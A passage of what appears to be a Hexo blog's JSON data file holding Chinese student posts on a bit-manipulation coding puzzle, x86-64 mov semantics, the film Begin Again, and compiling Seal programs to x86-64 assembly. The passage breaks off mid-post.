fence=\"true\">(</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo>⊕</mo><mi>i</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">high=high \\land \\lnot low \\land \\lnot input \\lor \\lnot high \\land low \\land input\\\\\nlow = \\lnot hight \\land \\left(low \\oplus input \\right)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathdefault\">h</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathdefault\">h</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">¬</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02691em;\">w</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord\">¬</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">t</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∨</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\">¬</span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathdefault\">h</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02691em;\">w</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">t</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02691em;\">w</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\">¬</span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">t</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02691em;\">w</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">t</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span></span></p>\n<p><strong>但事实上，以上所说的所有事情，都可以完全扩展到32位，不管是变量<code>high</code>还是<code>low</code></strong>。因为可以把一个32位的int看成32个独立的bit，并且并行地去处理每个bit。所以答案就出来了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">singleNumber</span><span class=\"params\">(<span class=\"keyword\">int</span> *nums, <span class=\"keyword\">int</span> numSize)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> low = <span class=\"number\">0</span>, high = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> orig_low;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; numSize; i++) &#123;</span><br><span class=\"line\">        orig_low = low;</span><br><span class=\"line\">        low = ~high &amp; (low ^ nums[i]);</span><br><span class=\"line\">        high = (high &amp; ~orig_low &amp; ~nums[i]) | (~high &amp; orig_low &amp;nums[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> low;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"X86-64中mov操作的一些疑难理解记录","top_img":false,"cover":"/img/CSAPP.jpeg","date":"2020-11-18T14:08:45.000Z","_content":"\n在写ICS作业的时候，我经常会因为看到以下代码而感到困惑。\n\n```assembly\nmovb\t$0xFF,\t%bl\n```\n\n我很纳闷，为什么这里是`movb`而不是`movl`，左边的immediate数不是32位补码吗？然后和院长交流了一下，突然点醒了我。\n\n其实不管是从immediate数还是从memory传数据到寄存器的时候，如果是**等长传送**的话，它只会取**目标寄存器**该取的长度。也就是说，即使是32-bit的immediate数，它也会作一次截取，把该拿走的位数拿走而已。如果是从memory拿那就更简单了，你要几个byte，就从内存初始地址拿几个byte，不过需要注意这里**小端法**和**大端法**会有区别，在相同的指令下他们可能会拿走不一样的数据。","source":"_posts/X86-64中mov操作的一些疑难理解记录.md","raw":"---\ntitle: X86-64中mov操作的一些疑难理解记录\ntop_img: false\ncover: /img/CSAPP.jpeg\ndate: 2020-11-18 22:08:45\ntags:\n- CSAPP\n---\n\n在写ICS作业的时候，我经常会因为看到以下代码而感到困惑。\n\n```assembly\nmovb\t$0xFF,\t%bl\n```\n\n我很纳闷，为什么这里是`movb`而不是`movl`，左边的immediate数不是32位补码吗？然后和院长交流了一下，突然点醒了我。\n\n其实不管是从immediate数还是从memory传数据到寄存器的时候，如果是**等长传送**的话，它只会取**目标寄存器**该取的长度。也就是说，即使是32-bit的immediate数，它也会作一次截取，把该拿走的位数拿走而已。如果是从memory拿那就更简单了，你要几个byte，就从内存初始地址拿几个byte，不过需要注意这里**小端法**和**大端法**会有区别，在相同的指令下他们可能会拿走不一样的数据。","slug":"X86-64中mov操作的一些疑难理解记录","published":1,"updated":"2020-11-21T12:52:36.047Z","_id":"ckiszi5a9000a98wa2qlmhoir","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在写ICS作业的时候，我经常会因为看到以下代码而感到困惑。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movb\t$0xFF,\t%bl</span><br></pre></td></tr></table></figure>\n<p>我很纳闷，为什么这里是<code>movb</code>而不是<code>movl</code>，左边的immediate数不是32位补码吗？然后和院长交流了一下，突然点醒了我。</p>\n<p>其实不管是从immediate数还是从memory传数据到寄存器的时候，如果是<strong>等长传送</strong>的话，它只会取<strong>目标寄存器</strong>该取的长度。也就是说，即使是32-bit的immediate数，它也会作一次截取，把该拿走的位数拿走而已。如果是从memory拿那就更简单了，你要几个byte，就从内存初始地址拿几个byte，不过需要注意这里<strong>小端法</strong>和<strong>大端法</strong>会有区别，在相同的指令下他们可能会拿走不一样的数据。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在写ICS作业的时候，我经常会因为看到以下代码而感到困惑。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movb\t$0xFF,\t%bl</span><br></pre></td></tr></table></figure>\n<p>我很纳闷，为什么这里是<code>movb</code>而不是<code>movl</code>，左边的immediate数不是32位补码吗？然后和院长交流了一下，突然点醒了我。</p>\n<p>其实不管是从immediate数还是从memory传数据到寄存器的时候，如果是<strong>等长传送</strong>的话，它只会取<strong>目标寄存器</strong>该取的长度。也就是说，即使是32-bit的immediate数，它也会作一次截取，把该拿走的位数拿走而已。如果是从memory拿那就更简单了，你要几个byte，就从内存初始地址拿几个byte，不过需要注意这里<strong>小端法</strong>和<strong>大端法</strong>会有区别，在相同的指令下他们可能会拿走不一样的数据。</p>\n"},{"title":"再观Begin Again","top_img":false,"cover":"/img/Begin Again.jpg","date":"2020-11-01T10:24:12.000Z","_content":"\n上一次看这部影片还是在高中。最近一直在循环Lost Stars，所以心血来潮重温了。\n\n高中刚看的时候，还处于懵懂无知的状态，是一个女孩推荐的。刚看完没什么感觉，除了女主气质很好、男二（Dave）是个jerk以外。\n{% img \"/img/Begin Again.jpg\" %}\n重新看了一遍之后，和年轻（无知）时的感觉确实不一样了。我很喜欢影片里那种我本以为只有东方人会有的、含蓄的、心照不宣的情感表达，不管是Gretta和Dan的心心相惜、还是Dave最后一边哭一边用歌曲与Gretta分道扬镳。\n\nGretta和Dan因为相互投其所好而相互吸引的片段，是我最喜欢、也是最羡慕的。找到一个知己很难，找到一个异性知己、擦出火花更难。而知己，也是庸人、普通人所不配所能够找到的。而即使是价值观上有矛盾的Dave和Gretta，最后也能相对和平、浪漫地分道扬镳。\n\n影片里的角色都多少因为自己所热爱的事物而重启了自己的生活，就像影片名所说的那样，Begin Again。\n\n{% img \"/img/begin again 2.jpg\" %}\n\n就像男主Dan说的那样，我们经历的还太少太少。我还需要经历什么？我还有时间去经历吗？我还可以去经历吗？曾经的我这样想过，我发现我和从前的我，并没有多少两样。\n\n我很喜欢凯拉奈特莉在影片中的演绎，知性、简单、潇洒，尤其是最后片段扭头就走、骑着单车一人穿梭在NY的也夜风里。给我推荐这部影片的女孩和她很像，我很欣赏她。\n\n我也可以重新上路的吧。","source":"_posts/再观Begin-Again.md","raw":"---\ntitle: 再观Begin Again\ntop_img: false\ncover: /img/Begin Again.jpg\ndate: 2020-11-01 18:24:12\ntags:\n- 杂谈\n- 电影\n---\n\n上一次看这部影片还是在高中。最近一直在循环Lost Stars，所以心血来潮重温了。\n\n高中刚看的时候，还处于懵懂无知的状态，是一个女孩推荐的。刚看完没什么感觉，除了女主气质很好、男二（Dave）是个jerk以外。\n{% img \"/img/Begin Again.jpg\" %}\n重新看了一遍之后，和年轻（无知）时的感觉确实不一样了。我很喜欢影片里那种我本以为只有东方人会有的、含蓄的、心照不宣的情感表达，不管是Gretta和Dan的心心相惜、还是Dave最后一边哭一边用歌曲与Gretta分道扬镳。\n\nGretta和Dan因为相互投其所好而相互吸引的片段，是我最喜欢、也是最羡慕的。找到一个知己很难，找到一个异性知己、擦出火花更难。而知己，也是庸人、普通人所不配所能够找到的。而即使是价值观上有矛盾的Dave和Gretta，最后也能相对和平、浪漫地分道扬镳。\n\n影片里的角色都多少因为自己所热爱的事物而重启了自己的生活，就像影片名所说的那样，Begin Again。\n\n{% img \"/img/begin again 2.jpg\" %}\n\n就像男主Dan说的那样，我们经历的还太少太少。我还需要经历什么？我还有时间去经历吗？我还可以去经历吗？曾经的我这样想过，我发现我和从前的我，并没有多少两样。\n\n我很喜欢凯拉奈特莉在影片中的演绎，知性、简单、潇洒，尤其是最后片段扭头就走、骑着单车一人穿梭在NY的也夜风里。给我推荐这部影片的女孩和她很像，我很欣赏她。\n\n我也可以重新上路的吧。","slug":"再观Begin-Again","published":1,"updated":"2020-11-02T10:13:21.230Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckiszi5ab000b98wa2g119kae","content":"<p>上一次看这部影片还是在高中。最近一直在循环Lost Stars，所以心血来潮重温了。</p>\n<p>高中刚看的时候，还处于懵懂无知的状态，是一个女孩推荐的。刚看完没什么感觉，除了女主气质很好、男二（Dave）是个jerk以外。</p>\n<img src=\"/img/Begin%20Again.jpg\" class=\"\">\n<p>重新看了一遍之后，和年轻（无知）时的感觉确实不一样了。我很喜欢影片里那种我本以为只有东方人会有的、含蓄的、心照不宣的情感表达，不管是Gretta和Dan的心心相惜、还是Dave最后一边哭一边用歌曲与Gretta分道扬镳。</p>\n<p>Gretta和Dan因为相互投其所好而相互吸引的片段，是我最喜欢、也是最羡慕的。找到一个知己很难，找到一个异性知己、擦出火花更难。而知己，也是庸人、普通人所不配所能够找到的。而即使是价值观上有矛盾的Dave和Gretta，最后也能相对和平、浪漫地分道扬镳。</p>\n<p>影片里的角色都多少因为自己所热爱的事物而重启了自己的生活，就像影片名所说的那样，Begin Again。</p>\n<img src=\"/img/begin%20again%202.jpg\" class=\"\">\n<p>就像男主Dan说的那样，我们经历的还太少太少。我还需要经历什么？我还有时间去经历吗？我还可以去经历吗？曾经的我这样想过，我发现我和从前的我，并没有多少两样。</p>\n<p>我很喜欢凯拉奈特莉在影片中的演绎，知性、简单、潇洒，尤其是最后片段扭头就走、骑着单车一人穿梭在NY的也夜风里。给我推荐这部影片的女孩和她很像，我很欣赏她。</p>\n<p>我也可以重新上路的吧。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>上一次看这部影片还是在高中。最近一直在循环Lost Stars，所以心血来潮重温了。</p>\n<p>高中刚看的时候，还处于懵懂无知的状态，是一个女孩推荐的。刚看完没什么感觉，除了女主气质很好、男二（Dave）是个jerk以外。</p>\n<img src=\"/img/Begin%20Again.jpg\" class=\"\">\n<p>重新看了一遍之后，和年轻（无知）时的感觉确实不一样了。我很喜欢影片里那种我本以为只有东方人会有的、含蓄的、心照不宣的情感表达，不管是Gretta和Dan的心心相惜、还是Dave最后一边哭一边用歌曲与Gretta分道扬镳。</p>\n<p>Gretta和Dan因为相互投其所好而相互吸引的片段，是我最喜欢、也是最羡慕的。找到一个知己很难，找到一个异性知己、擦出火花更难。而知己，也是庸人、普通人所不配所能够找到的。而即使是价值观上有矛盾的Dave和Gretta，最后也能相对和平、浪漫地分道扬镳。</p>\n<p>影片里的角色都多少因为自己所热爱的事物而重启了自己的生活，就像影片名所说的那样，Begin Again。</p>\n<img src=\"/img/begin%20again%202.jpg\" class=\"\">\n<p>就像男主Dan说的那样，我们经历的还太少太少。我还需要经历什么？我还有时间去经历吗？我还可以去经历吗？曾经的我这样想过，我发现我和从前的我，并没有多少两样。</p>\n<p>我很喜欢凯拉奈特莉在影片中的演绎，知性、简单、潇洒，尤其是最后片段扭头就走、骑着单车一人穿梭在NY的也夜风里。给我推荐这部影片的女孩和她很像，我很欣赏她。</p>\n<p>我也可以重新上路的吧。</p>\n"},{"title":"基于Seal语法树生成X86-64代码","top_img":false,"cover":"/img/compiler.jpg","date":"2020-12-15T08:51:54.000Z","_content":"\n# 重新学习x86-64\n\n用gcc将以下代码翻译成x86-64\n\n```c\n#include <stdio.h>\n\nint main() {\n    printf(\"hello world!\\n\");\n    return 0;\n}\n```\n\n```bash\ngcc -S test.c\n```\n\n得到如下代码：\n\n```assembly\n\t.file\t\"test.c\"\n\t.text\n\t.section\t.rodata\n.LC0:\n\t.string\t\"hello world\"\n\t.text\n\t.globl\tmain\n\t.type\tmain, @function\nmain:\n.LFB0:\n\t.cfi_startproc\n\tpushq\t%rbp\n\t.cfi_def_cfa_offset 16\n\t.cfi_offset 6, -16\n\tmovq\t%rsp, %rbp\n\t.cfi_def_cfa_register 6\n\tleaq\t.LC0(%rip), %rdi\n\tcall\tputs@PLT\n\tmovl\t$0, %eax\n\tpopq\t%rbp\n\t.cfi_def_cfa 7, 8\n\tret\n\t.cfi_endproc\n.LFE0:\n\t.size\tmain, .-main\n\t.ident\t\"GCC: (GNU) 10.2.0\"\n\t.section\t.note.GNU-stack,\"\",@progbits\n```\n\n## 汇编程序的构成\n\n### 指示 (Directives)\n\n以**点号**开始，用来<font color=red>指示结构信息</font>。本身不是汇编指令。\n\n比如：`.file`表示源文件名，`.string`表示字符串常量，`.global main`代表**标签**main是一个可以在其它模块的代码中被访问的全局符号 。还有一些杂七杂八的指示语句。\n\n### 标签 (Labels)\n\n以**冒号**结尾，将标签名和标签的位置关联。\n\n以点号开始的标签都是编译器生成的临时局部标签，其它标签则是用户可见的函数和全局变量名称。\n\n### 指令 (Instructions)\n\n就是普通的x86-64指令，一般有缩进。\n\n## 从Seal代码包给出的例子管中窥豹\n\n不同的编译器翻译出来的汇编代码不一样，基本不是人读的。甚至不同的gcc版本都会翻译出不一样的代码。所以从助教给出的例子里找一找规律。\n\n### hello world 程序\n\n一个是用seal写的hello world程序：\n\n```\nfunc main() Void{\n    printf(\"Hello world!\");\n\n    return;\n}\n```\n\n对应的汇编：\n\n```assembly\n# start of generated code\n\t.section\t\t.rodata\t\n.LC0:\n\t.string\t\"Hello world!\"\n\t.text\t\n\t.globl\tmain\n\t.type\tmain, @function\nmain:\n\tpushq\t %rbp\n\tmovq\t%rsp, %rbp\n\tpushq\t %rbx\n\tpushq\t %r10\n\tpushq\t %r11\n\tpushq\t %r12\n\tpushq\t %r13\n\tpushq\t %r14\n\tpushq\t %r15\n\tsubq\t$8, %rsp\n\tmovq\t$.LC0, %rax\n\tmovq\t%rax, -64(%rbp)\n\tmovq\t-64(%rbp), %rdi\n\tsubq\t$8, %rsp\n\tmovl\t$0, %eax\n\tcall\t printf\n\tpopq\t %r15\n\tpopq\t %r14\n\tpopq\t %r13\n\tpopq\t %r12\n\tpopq\t %r11\n\tpopq\t %r10\n\tpopq\t %rbx\n\tleave\t\n\tret\t\n\t.size\tmain, .-main\n\n# end of generated code\n```\n\n首先能看到一些之前用C写的hello world编译出来的代码里看不到的一些指示语句。分别是：`.section`、`.rodata`和`.type\tmain, @function`\n\nGoogle了一下，`.rodata`代表了**常量区**，一般用于存放字符串常量，至于静态变量在不在这里，我也不知道，这个作业暂时不需要考虑。\n\n`.section`和`.type\tmain, @function`没查到有什么意义，但是大致知道了程序结构。程序的开头如下：\n\n```assembly\n\t.section\t\t.rodata\t\n.LC0:\n\t.string\t\"Hello world!\"\n```\n\n这一段存储字符串常量。\n\n从`.text`开始，就是程序的正文。对每个函数`f`，都有以下的结构：\n\n```assembly\n\t.globl\tf\n\t.type\tf, @function\nf:\n\t...\t//程序正文\n\t.size\tf, .-f\n```\n\n### 更加复杂的程序\n\nseal中内置了一个`printf`函数，来看一下是怎么用的。\n\n一个Fibonacci程序：\n\n```\nfunc fib(x Int) Int {\n    if x <= 2 {\n        return 1;\n    } \n\n    return fib(x-1) + fib(x-2);\n}\n\n\nfunc main() Void{\n    var i Int;\n    for i = 1;i < 15; i = i + 1 {\n        printf(\"fib(%lld) = %lld \\n\", i, fib(i));\n    }\n\n    return;\n}\n```\n\n转换后的汇编：\n\n```assembly\n# start of generated code\n\t.section\t\t.rodata\t\n.LC0:\n\t.string\t\"fib(%lld) = %lld \\n\"\n\t.text\t\n\t.globl\tfib\n\t.type\tfib, @function\nfib:\n\tpushq\t %rbp\n\tmovq\t%rsp, %rbp\n\tpushq\t %rbx\n\tpushq\t %r10\n\tpushq\t %r11\n\tpushq\t %r12\n\tpushq\t %r13\n\tpushq\t %r14\n\tpushq\t %r15\n\tsubq\t$8, %rsp\n\tmovq\t%rdi, -64(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t$2, %rax\n\tmovq\t%rax, -72(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t-64(%rbp), %rax\n\tmovq\t-72(%rbp), %rdx\n\tcmpq\t%rdx, %rax\n\tjle\t .POS2\n\tmovq\t$0, %rax\n\tjmp\t .POS3\n.POS2:\n\tmovq\t$1, %rax\n.POS3:\n\tmovq\t%rax, -80(%rbp)\n\tmovq\t-80(%rbp), %rax\n\ttestq\t%rax, %rax\n\tjz\t .POS0\n\tsubq\t$8, %rsp\n\tmovq\t$1, %rax\n\tmovq\t%rax, -88(%rbp)\n\tmovq\t-88(%rbp), %rax\n\tpopq\t %r15\n\tpopq\t %r14\n\tpopq\t %r13\n\tpopq\t %r12\n\tpopq\t %r11\n\tpopq\t %r10\n\tpopq\t %rbx\n\tleave\t\n\tret\t\n\tjmp\t .POS1\n.POS0:\n.POS1:\n\tsubq\t$8, %rsp\n\tmovq\t$1, %rax\n\tmovq\t%rax, -96(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t-64(%rbp), %rbx\n\tmovq\t-96(%rbp), %r10\n\tsubq\t%r10, %rbx\n\tmovq\t%rbx, -104(%rbp)\n\tmovq\t-104(%rbp), %rdi\n\tcall\t fib\n\tsubq\t$8, %rsp\n\tmovq\t%rax, -112(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t$2, %rax\n\tmovq\t%rax, -120(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t-64(%rbp), %rbx\n\tmovq\t-120(%rbp), %r10\n\tsubq\t%r10, %rbx\n\tmovq\t%rbx, -128(%rbp)\n\tmovq\t-128(%rbp), %rdi\n\tcall\t fib\n\tsubq\t$8, %rsp\n\tmovq\t%rax, -136(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t-112(%rbp), %rbx\n\tmovq\t-136(%rbp), %r10\n\taddq\t%rbx, %r10\n\tmovq\t%r10, -144(%rbp)\n\tmovq\t-144(%rbp), %rax\n\tpopq\t %r15\n\tpopq\t %r14\n\tpopq\t %r13\n\tpopq\t %r12\n\tpopq\t %r11\n\tpopq\t %r10\n\tpopq\t %rbx\n\tleave\t\n\tret\t\n\t.size\tfib, .-fib\n\t.globl\tmain\n\t.type\tmain, @function\nmain:\n\tpushq\t %rbp\n\tmovq\t%rsp, %rbp\n\tpushq\t %rbx\n\tpushq\t %r10\n\tpushq\t %r11\n\tpushq\t %r12\n\tpushq\t %r13\n\tpushq\t %r14\n\tpushq\t %r15\n\tsubq\t$8, %rsp\n\tsubq\t$8, %rsp\n\tmovq\t$1, %rax\n\tmovq\t%rax, -16(%rbp)\n\tmovq\t-16(%rbp), %rax\n\tmovq\t%rax, -8(%rbp)\n.POS4:\n\tsubq\t$8, %rsp\n\tmovq\t$15, %rax\n\tmovq\t%rax, -24(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t-8(%rbp), %rax\n\tmovq\t-24(%rbp), %rdx\n\tcmpq\t%rdx, %rax\n\tjl\t .POS7\n\tmovq\t$0, %rax\n\tjmp\t .POS8\n.POS7:\n\tmovq\t$1, %rax\n.POS8:\n\tmovq\t%rax, -32(%rbp)\n\tmovq\t-32(%rbp), %rax\n\ttestq\t%rax, %rax\n\tjz\t .POS6\n\tsubq\t$8, %rsp\n\tmovq\t$.LC0, %rax\n\tmovq\t%rax, -40(%rbp)\n\tmovq\t-8(%rbp), %rdi\n\tcall\t fib\n\tsubq\t$8, %rsp\n\tmovq\t%rax, -48(%rbp)\n\tmovq\t-40(%rbp), %rdi\n\tmovq\t-8(%rbp), %rsi\n\tmovq\t-48(%rbp), %rdx\n\tsubq\t$8, %rsp\n\tmovl\t$0, %eax\n\tcall\t printf\n.POS5:\n\tsubq\t$8, %rsp\n\tmovq\t$1, %rax\n\tmovq\t%rax, -64(%rbp)\n\tsubq\t$8, %rsp\n\tmovq\t-8(%rbp), %rbx\n\tmovq\t-64(%rbp), %r10\n\taddq\t%rbx, %r10\n\tmovq\t%r10, -72(%rbp)\n\tmovq\t-72(%rbp), %rax\n\tmovq\t%rax, -8(%rbp)\n\tjmp\t .POS4\n.POS6:\n\tpopq\t %r15\n\tpopq\t %r14\n\tpopq\t %r13\n\tpopq\t %r12\n\tpopq\t %r11\n\tpopq\t %r10\n\tpopq\t %rbx\n\tleave\t\n\tret\t\n\t.size\tmain, .-main\n\n# end of generated code\n\n```\n\n可以看到，程序的结构还是这样，只不过复杂的程序对应汇编代码正文比较长，但值得关注的是以下这行代码所对应的汇编语句：\n\n```\nprintf(\"fib(%lld) = %lld \\n\", i, fib(i));\n```\n\n首先，字符串`\"fib(%lld) = %lld \\n\"`是位于`.LC0`处的。把字符串的首地址存入内存\n\n```assembly\n\tsubq\t$8, %rsp\n\tmovq\t$.LC0, %rax\n\tmovq\t%rax, -40(%rbp)\n```\n\n然后运算了`fib(i)`，变量`i` 在`-8(%rbp)`内存中。\n\n```assembly\n\tmovq\t-8(%rbp), %rdi\n\tcall\t fib\n```\n\n`fib`返回之后将`%rax`中的值存入内存，再调用`printf`函数\n\n```assembly\n\tsubq\t$8, %rsp\t// 分配内存\n\tmovq\t%rax, -48(%rbp)\n\tmovq\t-40(%rbp), %rdi\t// 字符串\n\tmovq\t-8(%rbp), %rsi\t// i\n\tmovq\t-48(%rbp), %rdx\t// fib(i)\n\tsubq\t$8, %rsp\n\tmovl\t$0, %eax\n\tcall\tprintf\n```\n\n除了这个比较复杂的函数以外，其他都没什么问题，要注意一下**caller-saved register**和**callee-saved register**。","source":"_posts/基于Seal语法树生成X86-64代码.md","raw":"---\ntitle: 基于Seal语法树生成X86-64代码\ntop_img: false\ncover: /img/compiler.jpg\ndate: 2020-12-15 16:51:54\ntags:\n- 编译原理\n---\n\n# 重新学习x86-64\n\n用gcc将以下代码翻译成x86-64\n\n```c\n#include <stdio.h>\n\nint main() {\n    printf(\"hello world!\\n\");\n    return 0;\n}\n```\n\n```bash\ngcc -S test.c\n```\n\n得到如下代码：\n\n```assembly\n\t.file\t\"test.c\"\n\t.text\n\t.section\t.rodata\n.LC0:\n\t.string\t\"hello world\"\n\t.text\n\t.globl\tmain\n\t.type\tmain, @function\nmain:\n.LFB0:\n\t.cfi_startproc\n\tpushq\t%rbp\n\t.cfi_def_cfa_offset 16\n\t.cfi_offset 6, -16\n\tmovq\t%rsp, %rbp\n\t.cfi_def_cfa_register 6\n\tleaq\t.LC0(%rip), %rdi\n\tcall\tputs@PLT\n\tmovl\t$0, %eax\n\tpopq\t%rbp\n\t.cfi_def_cfa 7, 8\n\tret\n\t.cfi_endproc\n.LFE0:\n\t.size\tmain, .-main\n\t.ident\t\"GCC: (GNU) 10.2.0\"\n\t.section\t.note.GNU-stack,\"\",@progbits\n```\n\n## 汇编程序的构成\n\n### 指示 (Directives)\n\n以**点号**开始，用来<font color=red>指示结构信息</font>。本身不是汇编指令。\n\n比如：`.file`表示源文件名，`.string`表示字符串常量，`.global main`代表**标签**main是一个可以在其它模块的代码中被访问的全局符号 。还有一些杂七杂八的指示语句。\n\n### 标签 (Labels)\n\n以**冒号**结尾，将标签名和标签的位置关联。\n\n以点号开始的标签都是编译器生成的临时局部标签，其它标签则是用户可见的函数和全局变量名称。\n\n### 指令 (Instructions)\n\n就是普通的x86-64指令，一般有缩进。\n\n## 从Seal代码包给出的例子管中窥豹\n\n不同的编译器翻译出来的汇编代码不一样，基本不是人读的。甚至不同的gcc版本都会翻译出不一样的代码。所以从助教给出的例子里找一找规律。\n\n### hello world 程序\n\n一个是用seal写的hello world程序：\n\n```\nfunc main() Void{\n    printf(\"Hello world!\");\n\n    return;\n}\n```\n\n对应的汇编：\n\n```assembly\n# start of generated code\n\t.section\t\t.rodata\t\n.LC0:\n\t.string\t\"Hello world!\"\n\t.text\t\n\t.globl\tmain\n\t.type\tmain, @function\nmain:\n\tpushq\t %rbp\n\tmovq\t%rsp, %rbp\n\tpushq\t %rbx\n\tpushq\t %r10\n\tpushq\t %r11\n\tpushq\t %r12\n\tpushq\t %r13\n\tpushq\t %r14\n\tpushq\t %r15\n\tsubq\t$8, %rsp\n\tmovq\t$.LC0, %rax\n\tmovq\t%rax, -64(%rbp)\n\tmovq\t-64(%rbp), %rdi\n\tsubq\t$8, %rsp\n\tmovl\t$0, %eax\n\tcall\t printf\n\tpopq\t %r15\n\tpopq\t %r14\n\tpopq\t %r13\n\tpopq\t %r12\n\tpopq\t %r11\n\tpopq\t %r10\n\tpopq\t %rbx\n\tleave\t\n\tret\t\n\t.size\tmain, .-main\n\n# end of generated code\n```\n\n首先能看到一些之前用C写的hello world编译出来的代码里看不到的一些指示语句。分别是：`.section`、`.rodata`和`.type\tmain, 